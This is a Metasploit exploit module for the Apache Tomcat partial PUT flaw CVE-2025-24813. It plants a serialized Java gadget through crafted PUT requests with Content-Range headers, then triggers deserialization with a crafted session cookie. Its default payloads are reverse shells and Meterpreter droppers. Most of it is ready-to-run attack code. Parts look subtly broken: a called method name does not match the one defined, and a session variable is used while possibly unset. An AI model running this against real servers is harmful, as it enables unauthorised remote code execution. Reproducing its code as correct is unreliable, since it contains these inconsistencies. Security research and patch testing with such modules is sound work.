##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell
  include Msf::Exploit::JavaDeserialization
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Tomcat Partial PUT RCE (CVE-2025-24813)',
        'Description' => %q{
          This module exploits a vulnerability in Apache Tomcat (CVE-2025-24813) that allows
          remote code execution via partial PUT requests under specific conditions. The issue
          stems from improper handling of temporary files during partial PUT uploads, which
          can be exploited to inject malicious serialized objects into file-based session
          persistence, leading to deserialization-based RCE if a vulnerable library is present.

          Affected versions include Tomcat 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, and
          9.0.0.M1 to 9.0.98. The exploit requires:
          - Writes enabled for the default servlet (disabled by default)
          - Partial PUT support (enabled by default)
          - File-based session persistence with a vulnerable deserialization library

          Users should upgrade to Tomcat 11.0.3, 10.1.35, or 9.0.99 to mitigate the issue.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'COSCO Shipping Lines DIC', # Original research
          'sw0rd1ight', # Original research
          'westonsteimel', # Github Advisory
          'Rudraditya Thakur (h4ck3r-04)' # Metasploit module
        ],
        'References' => [
          ['CVE', '2025-24813'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2025-24813'],
          ['URL', 'https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq'],
          ['URL', 'http://www.openwall.com/lists/oss-security/2025/03/10/5'],
          ['URL', 'https://github.com/absholi7ly/POC-CVE-2025-24813/blob/main/README.md'],
          ['URL', 'https://github.com/sw0rd1ight']
        ],
        'Platform' => ['win', 'linux', 'unix'],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => { 'Payload' => 'cmd/unix/reverse_bash' }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'DefaultOptions' => { 'Payload' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :windows_cmd,
              'DefaultOptions' => { 'Payload' => 'cmd/windows/powershell/reverse_tcp' }
            }
          ],
          [
            'Windows Dropper',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :windows_dropper,
              'DefaultOptions' => { 'Payload' => 'windows/x64/meterpreter/reverse_tcp' }
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2025-03-10',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'TARGETURI' => '/'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('SESSION_ID', [false, 'Target session ID - will auto-detect if empty (default: "")', '']),
      OptString.new('GADGET', [true, 'Java deserialization gadget chain', 'CommonsCollections6'])
    ])
  end

  # Checks if the target is vulnerable
  def check
    vprint_status("Checking if #{peer} is vulnerable.")
    res = check_writable_servlet
    return CheckCode::Safe('Target is not Apache Tomcat.') unless res && res.headers.key?('Server')
    if res.code == 201 || res.code == 204
      vprint_status("Partial PUT supported (HTTP #{res.code}).")
      return CheckCode::Appears('Target supports partial PUT; further conditions (session persistence, vulnerable library) need verification.')
    else
      vprint_status("Partial PUT not supported or writes disabled (HTTP #{res.code}).")
      return CheckCode::Safe('Target does not support partial PUT or writes are disabled.')
    end
  end

  # Executes the exploit against the target
  def exploit
    print_status("Starting exploitation of #{peer}...")
    session_id = datastore['SESSION_ID'].empty? ? get_session_id : datastore['SESSION_ID']
    print_status("Using session ID: #{session_id}")
    
    # Generate the Java deserialization payload using the specified gadget chain
    begin
      java_payload = generate_java_deserialization_for_payload(datastore['GADGET'], payload)
    rescue RuntimeError => e
      fail_with(Failure::BadConfig, "Failed to generate payload: #{e.message}")
    end
    unless java_payload
      fail_with(Failure::Unknown, 'Failed to generate Java deserialization payload.')
    end
    print_status("Java deserialization payload generated successfully.")
    if upload_and_verify_payload(session_id, java_payload)
      print_good("Exploit succeeded! Payload uploaded and triggered.")
      case target['Type']
      when :unix_cmd, :windows_cmd
        print_status("Command payload executed.")
      when :linux_dropper, :windows_dropper
        execute_cmdstager
      end
    else
      fail_with(Failure::UnexpectedReply, 'Exploit failed during upload or verification.')
    end
  end

  # Tests if the default servlet allows PUT requests
  def check_writable_servlet
    send_request_cgi({
      'method' => 'PUT',
      'uri' => normalize_uri(target_uri.path, 'check.txt'),
      'headers' => {
        'Content-Length' => "#{rand(5000..15000)}",
        'Content-Range' => "bytes 0-#{rand(500..1500)}/#{rand(2000..3000)}"
      },
      'data' => 'testdata',
      'timeout' => 10,
      'ssl' => datastore['SSL']
    })
  end

  # Retrieves or defaults to a session ID
  def get_session_id
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.jsp'),
      'timeout' => 10,
      'ssl' => datastore['SSL']
    })
    unless res
      fail_with(Failure::Unreachable, 'Could not retrieve session ID.')
    end
    jsessionid = res.get_cookies[/JSESSIONID=([^;]+)/, 1]
    return jsessionid if jsessionid
    session_match = res.body.match(/Session ID: (\w+)/)
    return session_match[1] if session_match
    session_id = Rex::Text.rand_text_alphanumeric(16)
    print_status("Session ID not found; generating random ID: #{session_id}")
    @generated_session_id = session_id
    session_id
  end

  # Generates a Java deserialization payload in-memory
  def generate_java_deserialization_payload(gadget, payload)
    cmd = target['Platform'] == 'win' ? "cmd.exe /c #{payload.encoded}" : "/bin/sh -c '#{payload.encoded}'"
    print_status("Generating Java deserialization payload for: #{cmd}")
    begin
      shell = target['Platform'] == 'win' ? 'cmd' : 'bash'
      generate_java_deserialization_for_command(gadget, shell, payload.encoded)
    rescue => e
      print_error("Error generating deserialization payload: #{e.message}")
      nil
    end
  end

  # Uploads the payload and verifies exploitation
  def upload_and_verify_payload(session_id, payload_data)
    exploit_uri = normalize_uri(target_uri.path, "#{@generated_session_id}.session")
    put_res = send_request_cgi({
      'method' => 'PUT',
      'uri' => exploit_uri,
      'headers' => {
        'Content-Length' => "#{rand(5000..15000)}",
        'Content-Range' => "bytes 0-#{rand(500..1500)}/#{rand(2000..3000)}"
      },
      'data' => payload_data,
      'timeout' => 10,
      'ssl' => datastore['SSL']
    })
    unless [409, 201].include?(put_res&.code)
      print_status("Upload failed with HTTP #{put_res&.code}")
      return false
    end
    print_status("Payload uploaded successfully (HTTP #{put_res&.code}). Triggering deserialization...")
    get_res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path),
      'headers' => { 'Cookie' => "JSESSIONID=a.#{@generated_session_id}" },
      'timeout' => 10,
      'ssl' => datastore['SSL']
    })
    if get_res&.code == 500
      print_good("Deserialization triggered successfully (HTTP 500).")
      true
    else
      print_status("Trigger failed (HTTP #{get_res&.code}).")
      false
    end
  end

  # Returns the target address as a string
  def peer
    "#{datastore['RHOST']}:#{datastore['RPORT']}"
  end
end